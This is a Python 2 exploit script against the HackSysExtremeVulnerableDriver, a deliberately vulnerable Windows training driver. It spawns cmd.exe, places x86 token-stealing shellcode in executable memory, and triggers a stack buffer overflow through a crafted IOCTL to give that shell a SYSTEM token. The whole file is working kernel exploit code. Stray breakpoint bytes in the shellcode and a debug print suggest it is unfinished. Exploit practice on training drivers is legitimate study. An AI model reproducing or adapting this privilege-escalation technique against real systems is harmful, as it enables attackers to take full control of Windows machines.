from ctypes import *
from ctypes.wintypes import *
import sys, struct, time

### Bitmasks ###
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

### WinAPI shorthand ###
CreateFile = windll.kernel32.CreateFileW
DeviceIoControl = windll.kernel32.DeviceIoControl
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateProcess = windll.kernel32.CreateProcessW

### Startup info for CreateProcess API ###

class STARTUPINFO(Structure):
    """STARTUPINFO struct for CreateProcess API"""

    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):

    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

### Spawn SYSTEM cmd ###
def boomHeadshot():
    print "[*]Spawning shell[*]"
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()

    ret = CreateProcess(lpApplicationName,           # _In_opt_      LPCTSTR
                        lpCommandLine,               # _Inout_opt_   LPTSTR
                        lpProcessAttributes,         # _In_opt_      LPSECURITY_ATTRIBUTES
                        lpThreadAttributes,          # _In_opt_      LPSECURITY_ATTRIBUTES
                        bInheritHandles,             # _In_          BOOL
                        dwCreationFlags,             # _In_          DWORD
                        lpEnvironment,               # _In_opt_      LPVOID
                        lpCurrentDirectory,          # _In_opt_      LPCTSTR
                        byref(lpStartupInfo),        # _In_          LPSTARTUPINFO
                        byref(lpProcessInformation)) # _Out_         LPPROCESS_INFORMATION
    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    time.sleep(2) # Make sure cmd.exe spawns fully before shellcode executes

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    return lpProcessInformation.dwProcessId


### Stealing SYSTEM token ###
def shellcode(pid):
    print "Is this breaking?"
    print "cmd.exe pid is: " + str(pid)
    time.sleep(1)
    tokenstealing = (
        "\x64\x8B\x15\x24\x01\x00\x00"
        "\x8B\x42\x50"
        "\x8B\x98\xB8\x00\x00\x00"
        "\x8B\x0B"
        "\xCC\x8B\x51\xF8"              # F8 for 8 bytes FC for 4 bytes
        "\x83\xFA\x04"
        "\x74\x04"
        "\x8B\x09"
        "\xEB\xF3"
        "\xCC\x8B\x81\x80\x00\x00\x00"
        "\x24\xF0"
        "\x8B\x52\xF8"
        "\x81\xFA" + struct.pack("<I",pid) +
        "\x74\x04"
        "\x8B\x09"
        "\xEB\xF1"
        "\x89\x81\x80\x00\x00\x00"
        "\x83\xC4\x28"
        "\xC3")

    print "[*]Allocating buffer for shellcode[*]"
    lpAddress = None
    dwSize = len(tokenstealing)
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE

    allocateShell = VirtualAlloc(lpAddress,
                                 dwSize,
                                 flAllocationType,
                                 flProtect)

    if not allocateShell:
        print "\t[-]Error allocating shellcode: " + FormatError()
        sys.exit(-1)

    print "\t[+]Shellcode buffer allocated at 0x%x" % allocateShell

    ### Actual Alloc ###
    memmove(allocateShell, tokenstealing, len(tokenstealing))
    return allocateShell

### Get handle for driver and return ###
def gethandle():
    print "[*]Getting device handle[*]"
    lpFileName = u"\\\\.\\HackSysExtremeVulnerableDriver"
    dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName,
                         dwDesiredAccess,
                         dwShareMode,
                         lpSecurityAttributes,
                         dwCreationDisposition,
                         dwFlagsAndAttributes,
                         hTemplateFile)

    if not handle or handle == -1:
            print"\t[-]Error getting device handle: " + FormatError()
            sys.exit(-1)

    print "\t[+]Got device handle: 0x%x" % handle
    return handle

def ctl_code(function,
             devicetype=FILE_DEVICE_UNKNOWN,
             access=FILE_ANY_ACCESS,
             method=METHOD_NEITHER):
        return ((devicetype << 16) | (access << 14) | (function << 2) | method)

### Create buffer and send IOCRL ###
def trigger(hDevice, dwIoControlCode, scAllocateShell):

    shellz = create_string_buffer("A"*2092 + struct.pack("<L", scAllocateShell))
    print "[*]Triggering vulnerable IOCTL..."
    lpInBuffer = addressof(shellz)
    nInBufferSize = len(shellz)-1
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None

    pwnd = DeviceIoControl(hDevice,             # _In_        HANDLE
                           dwIoControlCode,     # _In_        DWORD
                           lpInBuffer,          # _In_opt_    LPVOID
                           nInBufferSize,       # _In_        DWORD
                           lpOutBuffer,         # _Out_opt_   LPVOID
                           nOutBufferSize,      # _In_        DWORD
                           lpBytesReturned,     # _Out_opt_   LPDWORD
                           lpOverlapped)        # _Inout_opt_ LPOVERLAPPED

    if not pwnd:
        print "\t[-]Error: You failed\n" + FormatError()
        sys.exit(-1)

if __name__ == "__main__":
        print "\nStack buffer overflow\n"

        pid = boomHeadshot()
        trigger(gethandle(), ctl_code(0x800), shellcode(pid))
